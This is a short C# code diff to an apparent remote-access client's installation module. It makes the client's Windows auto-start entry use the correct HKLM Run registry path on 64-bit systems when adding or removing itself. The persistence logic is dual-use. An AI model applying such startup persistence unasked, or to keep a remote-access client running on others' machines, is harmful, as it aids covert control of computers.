@@ -7,12 +7,20 @@ namespace xClient.Core.Installation
 {
     public static class Startup
     {
+        // ReSharper disable InconsistentNaming
+        private static string GetHKLMPath()
+        {
+            return (PlatformHelper.Is64Bit)
+                ? "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
+                : "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+        }
+
         public static bool AddToStartup()
         {
             if (WindowsAccountHelper.GetAccountType() == "Admin")
             {
-                bool success = RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath);
+                bool success = RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(),
+                    Settings.STARTUPKEY, ClientData.CurrentPath);
 
                 if (success) return true;
 
@@ -30,8 +38,8 @@ namespace xClient.Core.Installation
         {
             if (WindowsAccountHelper.GetAccountType() == "Admin")
             {
-                bool success = RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
-                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
+                bool success = RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(),
+                    Settings.STARTUPKEY);
 
                 if (success) return true;
 
